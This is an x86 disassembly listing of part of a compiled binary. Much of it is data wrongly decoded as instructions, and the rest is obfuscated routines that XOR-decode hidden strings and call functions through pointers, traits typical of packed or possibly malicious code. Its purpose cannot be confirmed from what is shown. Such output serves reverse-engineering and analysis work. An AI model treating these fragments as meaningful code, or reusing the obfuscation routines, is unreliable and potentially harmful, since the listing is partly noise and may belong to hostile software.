  41a8c0:	inc    ebx
  41a8c1:	push   edi
  41a8c2:	fcomp  QWORD PTR [edx]
  41a8c4:	repnz push edx
  41a8c6:	jg     0x41a854
  41a8c8:	xor    DWORD PTR [eax+0x21],eax
  41a8cb:	xchg   esp,eax
  41a8cc:	xor    ah,BYTE PTR [ebx+0x5a]
  41a8cf:	add    eax,0xbb9f5b8b
  41a8d4:	or     al,0x47
  41a8d6:	test   eax,0xe12ff0eb
  41a8db:	in     eax,0x60
  41a8dd:	sbb    al,0xe4
  41a8df:	xchg   ecx,eax
  41a8e0:	iret   
  41a8e1:	adc    esp,esp
  41a8e3:	xchg   ebx,eax
  41a8e4:	retf   
  41a8e5:	js     0x41a8a8
  41a8e7:	jae    0x41a903
  41a8e9:	clc    
  41a8ea:	adc    BYTE PTR [edx+0x862cf97],dh
  41a8f0:	stc    
  41a8f1:	sub    DWORD PTR [ecx-0x55],0xffffffe5
  41a8f5:	jnp    0x41a91f
  41a8f7:	dec    ebp
  41a8f8:	shr    BYTE PTR [ebp+eax*8-0x322797ea],0xe2
  41a900:	scas   eax,DWORD PTR es:[edi]
  41a901:	mov    ch,0x1f
  41a903:	adc    al,0xa2
  41a905:	(bad)  
  41a906:	imul   edi,DWORD PTR [edi+edx*8],0x53
  41a90a:	fst    QWORD PTR [ebx+0x1436a7a1]
  41a910:	or     BYTE PTR [edi+0x7c],0x92
  41a914:	xchg   ebx,eax
  41a915:	stos   BYTE PTR es:[edi],al
  41a916:	push   ds
  41a917:	hlt    
  41a918:	mov    dl,0x5b
  41a91a:	push   esi
  41a91b:	leave  
  41a91c:	xor    al,0xac
  41a91e:	stos   DWORD PTR es:[edi],eax
  41a91f:	leave  
  41a920:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a921:	nop
  41a922:	out    0xf8,al
  41a924:	leave  
  41a925:	out    dx,eax
  41a926:	pop    esi
  41a927:	outs   dx,BYTE PTR ds:[esi]
  41a928:	aaa    
  41a929:	xchg   bh,ah
  41a92b:	icebp  
  41a92c:	ret    0xae59
  41a92f:	pop    ecx
  41a930:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a931:	scas   al,BYTE PTR es:[edi]
  41a932:	mov    ch,0xc2
  41a934:	add    cl,BYTE PTR [edx]
  41a936:	add    BYTE PTR [eax-0x7ea83b42],ch
  41a93c:	mov    dl,0xf7
  41a93e:	dec    ebx
  41a93f:	mov    edi,0x5278dbf4
  41a944:	cdq    
  41a945:	in     eax,0x64
  41a947:	push   ebx
  41a948:	pusha  
  41a949:	lods   eax,DWORD PTR ds:[esi]
  41a94a:	into   
  41a94b:	xchg   edx,eax
  41a94c:	(bad)  
  41a94d:	test   eax,0x275a1d82
  41a953:	xchg   DWORD PTR [eax+0x6f],esi
  41a956:	mov    ah,0xfc
  41a958:	ret    
  41a959:	or     eax,0xdafd1ee8
  41a95e:	add    esi,DWORD PTR [ebp+0x6f]
  41a961:	mov    edx,0xfd04adbe
  41a966:	adc    BYTE PTR [edi+0x1c4dee9f],cl
  41a96c:	jo     0x41a98f
  41a96e:	jl     0x41a9be
  41a970:	dec    ebx
  41a971:	sbb    eax,0x795fc087
  41a976:	adc    eax,0x3e0630e
  41a97b:	(bad)  
  41a97c:	adc    bh,BYTE PTR [ecx]
  41a97e:	sub    DWORD PTR [ecx-0x52],0x13
  41a982:	or     DWORD PTR [ecx],esi
  41a984:	pop    ecx
  41a985:	push   edx
  41a986:	and    eax,0x4d564ed2
  41a98b:	xchg   esi,eax
  41a98c:	ficomp WORD PTR [eax+0x63]
  41a98f:	stos   BYTE PTR es:[edi],al
  41a990:	cmc    
  41a991:	fild   QWORD PTR [edx+0x45b96b10]
  41a997:	mov    dh,0x75
  41a999:	lea    ecx,[eax]
  41a99b:	and    DWORD PTR [ecx],ebp
  41a99d:	rol    DWORD PTR [eax+0x26b23b75],cl
  41a9a3:	iret   
  41a9a4:	out    dx,al
  41a9a5:	sar    DWORD PTR [eax+eax*8-0x1df9b790],cl
  41a9ac:	retf   0xa563
  41a9af:	lahf   
  41a9b0:	stos   DWORD PTR es:[edi],eax
  41a9b1:	std    
  41a9b2:	ins    DWORD PTR es:[edi],dx
  41a9b3:	ds or  eax,0xb03ae834
  41a9b9:	mov    cs,WORD PTR [edx]
  41a9bb:	mov    ebp,0xa27109fa
  41a9c0:	addr16 mov ds:0xdecc,al
  41a9c4:	cmp    BYTE PTR [esi-0x65725c3b],ch
  41a9ca:	outs   dx,BYTE PTR ds:[esi]
  41a9cb:	pop    ebx
  41a9cc:	(bad)
  41a9d0:	das    
  41a9d1:	mov    ebx,0x70298f87
  41a9d6:	cmp    bl,BYTE PTR [ebx+eiz*8]
  41a9d9:	call   0xcb7c:0x11779c26
  41a9e0:	xchg   cx,ax
  41a9e2:	test   DWORD PTR [ebx],ebp
  41a9e4:	and    al,0x4f
  41a9e6:	popf   
  41a9e7:	icebp  
  41a9e8:	dec    edx
  41a9e9:	fstp   QWORD PTR [ecx+0x1f]
  41a9ec:	pop    edi
  41a9ed:	add    al,0xdc
  41a9ef:	adc    edi,edi
  41a9f1:	mov    WORD PTR [esi],ds
  41a9f3:	mov    ds:0x245b88a2,eax
  41a9f8:	dec    ebx
  41a9f9:	mov    esi,0x3c21931e
  41a9fe:	mov    ss,esi
  41aa00:	and    bh,BYTE PTR [edx+0xf613236]
  41aa06:	(bad)  
  41aa07:	sub    BYTE PTR [ebp+0x4fe3cb3f],al
  41aa0d:	push   ebp
  41aa0e:	into   
  41aa0f:	rcl    DWORD PTR [esp+ebx*1],1
  41aa12:	xor    DWORD PTR [ebx-0x11803dab],0x79
  41aa19:	ret    0xd1d8
  41aa1c:	cdq    
  41aa1d:	lock (bad) 
  41aa20:	xor    eax,0xdaf8841e
  41aa25:	popa   
  41aa26:	test   DWORD PTR [eax],ebp
  41aa28:	repnz call 0xbee9:0x5cc35159
  41aa30:	push   cs
  41aa31:	fsubrp st(2),st
  41aa33:	mov    eax,0x7949fabc
  41aa38:	xchg   esp,eax
  41aa39:	fs cs push ds
  41aa3c:	in     eax,0xd8
  41aa3e:	jmp    0xb01e37c9
  41aa43:	mov    DWORD PTR [edx+0x56],ebp
  41aa46:	enter  0x191b,0x20
  41aa4a:	dec    edx
  41aa4b:	adc    dl,BYTE PTR [esi-0x79871394]
  41aa51:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aa52:	pusha  
  41aa53:	xor    esp,0xc30f6812
  41aa59:	outs   dx,DWORD PTR ds:[esi]
  41aa5a:	ret    0x3bd2
  41aa5d:	es movs BYTE PTR es:[edi],BYTE PTR fs:[esi]
  41aa60:	sbb    eax,0xd598bb67
  41aa65:	cmp    DWORD PTR [ebp-0x5c45255a],eax
  41aa6b:	add    ebp,edx
  41aa6d:	mov    bl,0x5
  41aa6f:	loope  0x41aaa8
  41aa71:	jo     0x41aadc
  41aa73:	mov    ds:0x29a87607,eax
  41aa78:	mov    ecx,0x71058fd8
  41aa7d:	mov    eax,ds:0x2e439f21
  41aa82:	ja     0x41aa05
  41aa84:	push   ecx
  41aa85:	jg     0x41aafc
  41aa87:	xchg   esi,eax
  41aa88:	int3   
  41aa89:	aad    0x2a
  41aa8b:	push   edi
  41aa8c:	jle    0x41aa11
  41aa8e:	out    0x5c,al
  41aa90:	fld    QWORD PTR [ebx]
  41aa92:	(bad)  
  41aa95:	add    bh,BYTE PTR [edi+0x37]
  41aa98:	pop    ds
  41aa99:	xchg   DWORD PTR [edx],edi
  41aa9b:	(bad)  
  41aa9c:	xchg   esp,eax
  41aa9d:	lahf   
  41aa9e:	dec    edi
  41aa9f:	dec    esp
  41aaa0:	in     eax,dx
  41aaa1:	fs lock jge 0x41aa62
  41aaa5:	xchg   esp,eax
  41aaa6:	lods   eax,DWORD PTR ds:[esi]
  41aaa7:	cmp    esp,ebp
  41aaa9:	adc    dl,dl
  41aaab:	mov    ah,0x39
  41aaad:	and    edi,edx
  41aaaf:	inc    edi
  41aab0:	mov    al,ds:0x1d86db7e
  41aab5:	add    dh,ah
  41aab7:	rcr    BYTE PTR [eax+0x2babab25],0xb0
  41aabe:	bndstx [edi],bnd0
  41aac1:	scas   eax,DWORD PTR es:[edi]
  41aac2:	shl    DWORD PTR [ecx],0xce
  41aac5:	outs   dx,BYTE PTR ds:[esi]
  41aac6:	out    0x60,eax
  41aac8:	aas    
  41aac9:	xchg   edi,eax
  41aaca:	cmp    eax,0x48
  41aacd:	test   al,0x55
  41aacf:	inc    esi
  41aad0:	pop    eax
  41aad1:	xchg   edi,eax
  41aad2:	aam    0xce
  41aad4:	popf   
  41aad5:	aaa    
  41aad6:	repnz stc 
  41aad8:	loop   0x41ab4b
  41aada:	mov    esp,0x2e6fb18d
  41aadf:	add    BYTE PTR [esi-0x72],ah
  41aae2:	sub    BYTE PTR [ebx-0x7d],0x41
  41aae6:	daa    
  41aae7:	add    DWORD PTR [ecx],0xffffffd8
  41aaea:	mov    BYTE PTR [ecx+0x11],0xb
  41aaee:	xor    eax,0x32863941
  41aaf3:	and    DWORD PTR [ebp+0xd07ba0a],0xe571d308
  41aafd:	mov    BYTE PTR [esi],cl
  41aaff:	leave  
  41ab00:	mov    ecx,0x574475e0
  41ab05:	push   0x24
  41ab07:	jl     0x41ab7f
  41ab09:	daa    
  41ab0a:	or     DWORD PTR [edi+esi*2-0x43],esi
  41ab0e:	in     eax,dx
  41ab0f:	push   0x68c067d5
  41ab14:	push   ds
  41ab15:	sbb    ch,bl
  41ab17:	mov    ebp,0x93b53978
  41ab1c:	xor    DWORD PTR [esi+0x62],ebx
  41ab1f:	inc    edx
  41ab20:	xor    BYTE PTR [ebp+0x1cb986d9],ah
  41ab26:	sub    eax,0xe9787820
  41ab2b:	mov    eax,ds:0x60a27534
  41ab30:	adc    al,0xbe
  41ab32:	into   
  41ab33:	push   ecx
  41ab34:	adc    BYTE PTR [esi-0x2b],dh
  41ab37:	inc    BYTE PTR [esi-0x7b]
  41ab3a:	shl    ch,1
  41ab3c:	or     dh,BYTE PTR [edi+0x70]
  41ab3f:	(bad)  
  41ab40:	or     eax,0x43e67cd9
  41ab45:	mov    bh,0x85
  41ab47:	pop    ebp
  41ab48:	jne    0x41ab94
  41ab4a:	push   esp
  41ab4b:	jle    0x41ab7e
  41ab4d:	sbb    eax,0xdb2fb9f1
  41ab52:	or     BYTE PTR [edx-0x3e7e5506],0xf8
  41ab59:	or     BYTE PTR [edi+0x0],dl
  41ab5c:	imul   ecx,edx
  41ab5f:	mov    DWORD PTR [ebp-0x58],ecx
  41ab62:	mov    ecx,DWORD PTR [ebp+0x8]
  41ab65:	mov    edx,DWORD PTR [ebp-0x54]
  41ab68:	add    ecx,0x64f8da
  41ab6e:	or     ecx,edx
  41ab70:	mov    DWORD PTR [ebp-0x54],ecx
  41ab73:	mov    ecx,DWORD PTR [ebp+0x8]
  41ab76:	mov    edx,DWORD PTR [ebp-0x50]
  41ab79:	add    ecx,0x242ebed
  41ab7f:	xor    ecx,edx
  41ab81:	mov    DWORD PTR [ebp-0x50],ecx
  41ab84:	mov    ecx,DWORD PTR [ebp+0x8]
  41ab87:	mov    edx,DWORD PTR [ebp-0x4c]
  41ab8a:	add    ecx,edi
  41ab8c:	and    ecx,edx
  41ab8e:	mov    DWORD PTR [ebp-0x4c],ecx
  41ab91:	mov    ecx,DWORD PTR [ebp+0x8]
  41ab94:	mov    edx,DWORD PTR [ebp-0x48]
  41ab97:	lea    ecx,[edx+ecx*1+0x241fc1f]
  41ab9e:	mov    DWORD PTR [ebp-0x48],ecx
  41aba1:	mov    ecx,DWORD PTR [ebp+0x8]
  41aba4:	mov    edx,0xfa5e15e2
  41aba9:	sub    edx,ecx
  41abab:	add    edx,DWORD PTR [ebp-0x44]
  41abae:	mov    DWORD PTR [ebp-0x44],edx
  41abb1:	mov    ecx,DWORD PTR [ebp+0x8]
  41abb4:	xor    ecx,eax
  41abb6:	add    ecx,esi
  41abb8:	jne    0x4187b7
  41abbe:	mov    ecx,DWORD PTR [ebp-0x8]
  41abc1:	xor    ecx,eax
  41abc3:	mov    eax,DWORD PTR [ebp+0x10]
  41abc6:	add    ecx,esi
  41abc8:	mov    DWORD PTR [eax],ecx
  41abca:	pop    edi
  41abcb:	pop    esi
  41abcc:	pop    ebx
  41abcd:	leave  
  41abce:	ret    0xc
  41abd1:	add    BYTE PTR [eax-0x5ffbffbe],ah
  41abd7:	inc    edx
  41abd8:	add    BYTE PTR [eax],cl
  41abda:	mov    al,ds:0xa00c0042
  41abdf:	inc    edx
  41abe0:	add    BYTE PTR [eax],dl
  41abe2:	mov    al,ds:0xa0140042
  41abe7:	inc    edx
  41abe8:	add    BYTE PTR [eax],bl
  41abea:	mov    al,ds:0xa01c0042
  41abef:	inc    edx
  41abf0:	add    BYTE PTR [eax],al
  41abf2:	rol    BYTE PTR [edx+0x0],1
  41abf5:	add    al,0xd0
  41abf7:	inc    edx
  41abf8:	add    BYTE PTR [eax],cl
  41abfa:	rol    BYTE PTR [edx+0x0],1
  41abfd:	or     al,0xd0
  41abff:	inc    edx
  41ac00:	add    BYTE PTR [eax],dl
  41ac02:	rol    BYTE PTR [edx+0x0],1
  41ac05:	adc    al,0xd0
  41ac07:	inc    edx
  41ac08:	add    BYTE PTR [eax],bl
  41ac0a:	rol    BYTE PTR [edx+0x0],1
  41ac0d:	sbb    al,0xd0
  41ac0f:	inc    edx
	...
  41ac24:	scas   al,BYTE PTR es:[edi]
  41ac25:	pop    esp
  41ac26:	nop
  41ac27:	dec    ebp
  41ac28:	add    BYTE PTR [eax],al
  41ac2a:	add    BYTE PTR [eax],al
  41ac2c:	add    al,BYTE PTR [eax]
  41ac2e:	add    BYTE PTR [eax],al
  41ac30:	cmp    eax,0xb0000000
  41ac35:	lods   al,BYTE PTR ds:[esi]
  41ac36:	add    DWORD PTR [eax],eax
  41ac38:	mov    al,0xa0
  41ac3a:	add    DWORD PTR [eax],eax
  41ac3c:	add    BYTE PTR [eax-0x6ffbffbe],dl
  41ac42:	inc    edx
  41ac43:	add    BYTE PTR [eax],cl
  41ac45:	nop
  41ac46:	inc    edx
  41ac47:	add    BYTE PTR [eax+edx*4],cl
  41ac4a:	inc    edx
  41ac4b:	add    BYTE PTR [eax],dl
  41ac4d:	nop
  41ac4e:	inc    edx
  41ac4f:	add    BYTE PTR [eax+edx*4],dl
  41ac52:	inc    edx
  41ac53:	add    BYTE PTR [eax],bl
  41ac55:	nop
  41ac56:	inc    edx
  41ac57:	add    BYTE PTR [eax+edx*4],bl
  41ac5a:	inc    edx
  41ac5b:	add    BYTE PTR [eax],ah
  41ac5d:	nop
  41ac5e:	inc    edx
  41ac5f:	add    BYTE PTR [eax+edx*4],ah
  41ac62:	inc    edx
  41ac63:	add    BYTE PTR [eax],ch
  41ac65:	nop
  41ac66:	inc    edx
  41ac67:	add    BYTE PTR [eax],al
  41ac69:	mov    al,0x42
  41ac6b:	add    BYTE PTR [eax+esi*4],al
  41ac6e:	inc    edx
  41ac6f:	add    BYTE PTR [eax],cl
  41ac71:	mov    al,0x42
  41ac73:	add    BYTE PTR [eax+esi*4],cl
  41ac76:	inc    edx
  41ac77:	add    BYTE PTR [eax],dl
  41ac79:	mov    al,0x42
  41ac7b:	add    BYTE PTR [eax+esi*4],dl
  41ac7e:	inc    edx
  41ac7f:	add    BYTE PTR [eax],bl
  41ac81:	mov    al,0x42
  41ac83:	add    BYTE PTR [eax+esi*4],bl
  41ac86:	inc    edx
  41ac87:	add    BYTE PTR [eax],al
  41ac89:	rol    BYTE PTR [edx+0x0],0x4
  41ac8d:	rol    BYTE PTR [edx+0x0],0x8
  41ac91:	rol    BYTE PTR [edx+0x0],0xc
  41ac95:	rol    BYTE PTR [edx+0x0],0x10
  41ac99:	rol    BYTE PTR [edx+0x0],0x14
  41ac9d:	rol    BYTE PTR [edx+0x0],0x18
  41aca1:	rol    BYTE PTR [edx+0x0],0x1c
  41aca5:	rol    BYTE PTR [edx+0x0],0x0
  41aca9:	add    BYTE PTR [eax],al
  41acab:	add    BYTE PTR [eax],al
  41acad:	add    BYTE PTR [eax],al
  41acaf:	add    BYTE PTR [edx+0x53],dl
  41acb2:	inc    esp
  41acb3:	push   ebx
  41acb4:	ret    
  41acb5:	mov    al,0x3d
  41acb7:	and    ebp,edx
  41acb9:	cmp    edi,esp
  41acbb:	dec    esp
  41acbc:	mov    ah,0x53
  41acbe:	dec    esp
  41acbf:	push   es
  41acc0:	fcom   QWORD PTR [ecx-0x66]
  41acc3:	aad    0x1
  41acc5:	add    BYTE PTR [eax],al
  41acc7:	add    BYTE PTR [ebx+0x3a],al
  41acca:	pop    esp
  41accb:	inc    ebx
  41accc:	jne    0x41ad40
  41acce:	jb     0x41ad35
  41acd0:	outs   dx,BYTE PTR ds:[esi]
  41acd1:	je     0x41ad17
  41acd3:	popa   
  41acd4:	je     0x41ad37
  41acd6:	pop    esp
  41acd7:	dec    ebp
  41acd8:	outs   dx,DWORD PTR ds:[esi]
  41acd9:	imul   esp,DWORD PTR fs:[esi+0x79],0x7070415c
  41ace1:	ins    BYTE PTR es:[edi],dx
  41ace2:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  41ace9:	dec    esi
  41acea:	gs ja  0x41aced
  41aced:	mov    edx,DWORD PTR [ebp-0x14]
  41acf0:	sub    esp,0xe4
  41acf6:	push   ebx
  41acf7:	push   edi
  41acf8:	mov    eax,ebx
  41acfa:	xchg   ecx,eax
  41acfb:	mov    eax,DWORD PTR [ebp+0x8]
  41acfe:	mov    edi,0xf89c85b9
  41ad03:	cmp    eax,edi
  41ad05:	jne    0x41b0a1
  41ad0b:	mov    eax,DWORD PTR [ebp+0xc]
  41ad0e:	cmp    eax,0xf89c85b8
  41ad13:	jne    0x41b0a1
  41ad19:	mov    eax,DWORD PTR [ebp+0x24]
  41ad1c:	mov    DWORD PTR [ebp-0x4],eax
  41ad1f:	mov    BYTE PTR [ebp-0x18],0x3
  41ad23:	mov    BYTE PTR [ebp-0x17],0x1e
  41ad27:	mov    BYTE PTR [ebp-0x16],0x1
  41ad2b:	mov    BYTE PTR [ebp-0x15],0x4f
  41ad2f:	mov    BYTE PTR [ebp-0x14],0x48
  41ad33:	mov    BYTE PTR [ebp-0x13],0x7a
  41ad37:	mov    BYTE PTR [ebp-0x20],0xd
  41ad3b:	mov    BYTE PTR [ebp-0x1f],0xf
  41ad3f:	mov    BYTE PTR [ebp-0x1e],0x1d
  41ad43:	mov    BYTE PTR [ebp-0x1d],0x8
  41ad47:	mov    BYTE PTR [ebp-0x1c],0x4f
  41ad4b:	mov    BYTE PTR [ebp-0x1b],0x48
  41ad4f:	mov    BYTE PTR [ebp-0x1a],0x7a
  41ad53:	mov    BYTE PTR [ebp-0x28],0xf
  41ad57:	mov    BYTE PTR [ebp-0x27],0x2
  41ad5b:	mov    BYTE PTR [ebp-0x26],0x6
  41ad5f:	mov    BYTE PTR [ebp-0x25],0xf3
  41ad63:	mov    BYTE PTR [ebp-0x24],0x19
  41ad67:	mov    BYTE PTR [ebp-0x23],0xa
  41ad6b:	push   esi
  41ad6c:	mov    BYTE PTR [ebp-0x22],0x1
  41ad70:	xor    edx,edx
  41ad72:	mov    BYTE PTR [ebp-0x21],0x7a
  41ad76:	xor    esi,esi
  41ad78:	mov    eax,0xf7
  41ad7d:	lea    ecx,[ebp+esi*1-0x18]
  41ad81:	movzx  ebx,BYTE PTR [ecx]
  41ad84:	xor    ebx,0x73
  41ad87:	add    ebx,eax
  41ad89:	inc    esi
  41ad8a:	mov    BYTE PTR [ecx],bl
  41ad8c:	cmp    esi,0x6
  41ad8f:	jb     0x41ad7d
  41ad91:	xor    esi,esi
  41ad93:	lea    ecx,[ebp+esi*1-0x20]
  41ad97:	movzx  ebx,BYTE PTR [ecx]
  41ad9a:	xor    ebx,0x73
  41ad9d:	add    ebx,eax
  41ad9f:	inc    esi
  41ada0:	mov    BYTE PTR [ecx],bl
  41ada2:	cmp    esi,0x7
  41ada5:	jb     0x41ad93
  41ada7:	xor    esi,esi
  41ada9:	lea    ecx,[ebp+esi*1-0x28]
  41adad:	movzx  ebx,BYTE PTR [ecx]
  41adb0:	xor    ebx,0x73
  41adb3:	add    ebx,eax
  41adb5:	inc    esi
  41adb6:	mov    BYTE PTR [ecx],bl
  41adb8:	cmp    esi,0x8
  41adbb:	jb     0x41ada9
  41adbd:	lea    eax,[ebp-0x2c]
  41adc0:	mov    DWORD PTR [ebp-0x8],eax
  41adc3:	mov    ecx,DWORD PTR [ebp-0x8]
  41adc6:	mov    eax,0x7113fcef
  41adcb:	mov    DWORD PTR [ecx],eax
  41adcd:	mov    ecx,DWORD PTR [ebp-0x2c]
  41add0:	cmp    ecx,eax
  41add2:	jne    0x41adde
  41add4:	mov    DWORD PTR [ebp-0x8],edi
  41add7:	mov    DWORD PTR [ebp-0x8],0xf89c85ea
  41adde:	mov    eax,DWORD PTR [ebp-0x4]
  41ade1:	mov    eax,DWORD PTR [eax+0x18c]
  41ade7:	mov    ebx,0x7510899
  41adec:	mov    esi,0x3272e0
  41adf1:	cmp    DWORD PTR [eax],edx
  41adf3:	jne    0x41b03d
  41adf9:	mov    eax,DWORD PTR [ebp-0x4]
  41adfc:	mov    eax,DWORD PTR [eax+0x17c]
  41ae02:	mov    DWORD PTR [eax],edx
  41ae04:	mov    eax,DWORD PTR [ebp-0x4]
  41ae07:	mov    eax,DWORD PTR [eax+0x180]
  41ae0d:	mov    DWORD PTR [eax],edx
  41ae0f:	mov    edi,0x4e3c
  41ae14:	mov    eax,0x4f8f
  41ae19:	mov    WORD PTR [ebp-0x78],ax
  41ae1d:	mov    eax,edi
  41ae1f:	mov    WORD PTR [ebp-0x76],ax
  41ae23:	add    eax,0x43
  41ae26:	mov    WORD PTR [ebp-0x74],ax
  41ae2a:	lea    eax,[edi+0x3]
  41ae2d:	mov    WORD PTR [ebp-0x72],ax
  41ae31:	mov    eax,0x4fac
  41ae36:	mov    WORD PTR [ebp-0x70],ax
  41ae3a:	lea    eax,[edi-0x4]
  41ae3d:	mov    WORD PTR [ebp-0x6e],ax
  41ae41:	add    eax,0x45
  41ae44:	mov    WORD PTR [ebp-0x6c],ax
  41ae48:	lea    eax,[edi-0x2]
  41ae4b:	mov    WORD PTR [ebp-0x6a],ax
  41ae4f:	mov    eax,edi
  41ae51:	mov    WORD PTR [ebp-0x68],ax
  41ae55:	dec    eax
  41ae56:	mov    WORD PTR [ebp-0x66],ax
  41ae5a:	mov    eax,0x99ff
  41ae5f:	mov    WORD PTR [ebp-0x64],ax
  41ae63:	mov    eax,0x8288
  41ae68:	mov    WORD PTR [ebp-0x62],ax
  41ae6c:	mov    eax,0xd78d
  41ae71:	mov    WORD PTR [ebp-0x60],ax
  41ae75:	add    eax,0x1c
  41ae78:	mov    WORD PTR [ebp-0x5e],ax
  41ae7c:	mov    eax,0x27aa
  41ae81:	mov    WORD PTR [ebp-0x5c],ax
  41ae85:	mov    eax,0x47aa
  41ae8a:	mov    WORD PTR [ebp-0x5a],ax
  41ae8e:	lea    eax,[edi-0x3]
  41ae91:	push   0x8
  41ae93:	mov    WORD PTR [ebp-0x58],ax
  41ae97:	mov    DWORD PTR [ebp-0x10],0xf306020f
  41ae9e:	mov    DWORD PTR [ebp-0xc],0x7a010a19
  41aea5:	lea    eax,[ebp-0x10]
  41aea8:	pop    ecx
  41aea9:	mov    dl,BYTE PTR [eax]
  41aeab:	xor    dl,0x73
  41aeae:	sub    dl,0x9
  41aeb1:	mov    BYTE PTR [eax],dl
  41aeb3:	inc    eax
  41aeb4:	dec    ecx
  41aeb5:	jne    0x41aea9
  41aeb7:	lea    eax,[ebp-0x10]
  41aeba:	mov    DWORD PTR [ebp-0xb8],eax
  41aec0:	lea    eax,[ebp-0xbc]
  41aec6:	push   eax
  41aec7:	mov    eax,DWORD PTR [ebp+0xc]
  41aeca:	xor    eax,ebx
  41aecc:	add    eax,esi
  41aece:	push   eax
  41aecf:	mov    eax,DWORD PTR [ebp-0x4]
  41aed2:	add    eax,0x66
  41aed5:	push   eax
  41aed6:	mov    eax,DWORD PTR [ebp-0x4]
  41aed9:	mov    eax,DWORD PTR [eax+0x198]
  41aedf:	mov    DWORD PTR [ebp-0xbc],0x1
  41aee9:	push   DWORD PTR [eax]
  41aeeb:	mov    eax,DWORD PTR [ebp+0x10]
  41aeee:	call   eax
  41aef0:	mov    ecx,DWORD PTR [ebp+0x8]
  41aef3:	xor    ecx,ebx
  41aef5:	add    ecx,esi
  41aef7:	mov    DWORD PTR [ebp-0x8],eax
  41aefa:	cmp    eax,ecx
  41aefc:	jne    0x41af17
  41aefe:	mov    eax,ds:0x33730bee
  41af03:	or     eax,0x22150bef
  41af08:	mov    ds:0x33730bee,eax
  41af0d:	add    eax,0x3372e90f
  41af12:	mov    ds:0x33730bee,eax
  41af17:	mov    ecx,0x4f84
  41af1c:	mov    eax,ecx
  41af1e:	mov    WORD PTR [ebp-0x40],ax
  41af22:	mov    eax,0x4e71
  41af27:	mov    edx,eax
  41af29:	mov    WORD PTR [ebp-0x3e],dx
  41af2d:	lea    edx,[ecx+0x15]
  41af30:	mov    WORD PTR [ebp-0x3c],dx
  41af34:	add    edx,0xfffffff8
  41af37:	mov    WORD PTR [ebp-0x3a],dx
  41af3b:	lea    edx,[ecx+0xf]
  41af3e:	mov    WORD PTR [ebp-0x38],dx
  41af42:	add    edx,0x1b
  41af45:	mov    WORD PTR [ebp-0x36],dx
  41af49:	lea    edx,[ecx+0x21]
  41af4c:	mov    WORD PTR [ebp-0x34],dx
  41af50:	mov    WORD PTR [ebp-0x32],cx
  41af54:	mov    ecx,edi
  41af56:	mov    WORD PTR [ebp-0x30],cx
  41af5a:	lea    ecx,[edx-0x1]
  41af5d:	mov    edx,ecx
  41af5f:	mov    WORD PTR [ebp-0x54],dx
  41af63:	mov    edx,eax
  41af65:	mov    WORD PTR [ebp-0x52],dx
  41af69:	add    edx,0x8
  41af6c:	mov    WORD PTR [ebp-0x50],dx
  41af70:	mov    WORD PTR [ebp-0x4e],ax
  41af74:	add    eax,0x2
  41af77:	mov    WORD PTR [ebp-0x4c],ax
  41af7b:	lea    eax,[ecx-0x16]
  41af7e:	mov    WORD PTR [ebp-0x4a],ax
  41af82:	add    eax,0xfffffff7
  41af85:	mov    WORD PTR [ebp-0x48],ax
  41af89:	mov    WORD PTR [ebp-0x46],cx
  41af8d:	mov    WORD PTR [ebp-0x44],di
  41af91:	mov    eax,DWORD PTR [ebp+0x8]
  41af94:	movzx  ecx,WORD PTR [ebp-0x54]
  41af98:	xor    eax,ebx
  41af9a:	add    eax,esi
  41af9c:	xor    eax,ecx
  41af9e:	mov    WORD PTR [ebp-0x54],ax
  41afa2:	mov    eax,DWORD PTR [ebp+0x8]
  41afa5:	movzx  ecx,WORD PTR [ebp-0x40]
  41afa9:	xor    eax,ebx
  41afab:	add    eax,esi
  41afad:	xor    eax,ecx
  41afaf:	mov    WORD PTR [ebp-0x40],ax
  41afb3:	xor    eax,eax
  41afb5:	mov    WORD PTR [ebp-0xd0],ax
  41afbc:	mov    WORD PTR [ebp-0xe4],ax
  41afc3:	mov    edi,DWORD PTR [ebp+0x24]
  41afc6:	lea    eax,[ebp-0xd0]
  41afcc:	lea    edx,[ebp-0x54]
  41afcf:	mov    DWORD PTR [ebp-0xbc],0x2
  41afd9:	mov    DWORD PTR [ebp-0xb8],eax
  41afdf:	call   0x41d97e
  41afe4:	mov    DWORD PTR [ebp-0xb4],eax
  41afea:	lea    eax,[ebp-0xbc]
  41aff0:	push   eax
  41aff1:	mov    eax,DWORD PTR [ebp+0xc]
  41aff4:	xor    eax,ebx
  41aff6:	add    eax,esi
  41aff8:	push   eax
  41aff9:	lea    eax,[ebp-0x78]
  41affc:	push   eax
  41affd:	push   DWORD PTR [ebp-0x8]
  41b000:	mov    eax,DWORD PTR [ebp+0x10]
  41b003:	call   eax
  41b005:	mov    edi,DWORD PTR [ebp+0x24]
  41b008:	lea    eax,[ebp-0xe4]
  41b00e:	lea    edx,[ebp-0x40]
  41b011:	mov    DWORD PTR [ebp-0xb8],eax
  41b017:	call   0x41d97e
  41b01c:	mov    DWORD PTR [ebp-0xb4],eax
  41b022:	lea    eax,[ebp-0xbc]
  41b028:	push   eax
  41b029:	mov    eax,DWORD PTR [ebp+0xc]
  41b02c:	xor    eax,ebx
  41b02e:	add    eax,esi
  41b030:	push   eax
  41b031:	lea    eax,[ebp-0x78]
  41b034:	push   eax
  41b035:	push   DWORD PTR [ebp-0x8]
  41b038:	mov    eax,DWORD PTR [ebp+0x10]
  41b03b:	call   eax
  41b03d:	mov    eax,DWORD PTR [ebp+0x14]
  41b040:	push   DWORD PTR [ebp-0x4]
  41b043:	push   DWORD PTR [ebp+0x20]
  41b046:	push   DWORD PTR [ebp+0x1c]
  41b049:	push   DWORD PTR [ebp+0x18]
  41b04c:	push   DWORD PTR [ebp+0x10]
  41b04f:	push   DWORD PTR [ebp+0x8]
  41b052:	push   DWORD PTR [ebp+0xc]
  41b055:	call   0x41c1fa
  41b05a:	test   eax,eax
  41b05c:	je     0x41b0a0
  41b05e:	add    DWORD PTR [ebp-0x4],eax
  41b061:	push   DWORD PTR [ebp-0x4]
  41b064:	lea    edi,[ebp+0x4]
  41b067:	call   0x41b490
  41b06c:	mov    eax,DWORD PTR [ebp-0x4]
  41b06f:	mov    eax,DWORD PTR [eax+0x1c8]
  41b075:	mov    eax,DWORD PTR [eax]
  41b077:	xor    eax,ebx
  41b079:	add    eax,esi
  41b07b:	mov    eax,DWORD PTR [ebp-0x4]
  41b07e:	jne    0x41b096
  41b080:	mov    ecx,DWORD PTR [ebp-0x4]
  41b083:	mov    ecx,DWORD PTR [ecx+0x1cc]
